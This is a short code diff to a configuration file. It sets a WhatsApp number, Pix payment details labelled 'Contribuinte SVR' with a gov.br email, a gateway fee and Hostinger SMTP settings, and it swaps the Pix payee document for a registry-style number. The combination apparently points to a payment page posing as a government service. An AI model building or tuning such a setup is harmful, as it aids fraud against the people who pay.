@@ -20,7 +20,7 @@ let currentConfig = {
   whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
   pixName: "Contribuinte SVR",
   pixEmail: "contato@svr.gov.br",
-  pixDocument: "13462947055",
+  pixDocument: "00.038.166/0001-05",
   gatewayFee: 5.0, // Taxa em %
   smtpHost: "smtp.hostinger.com",
   smtpPort: 465,
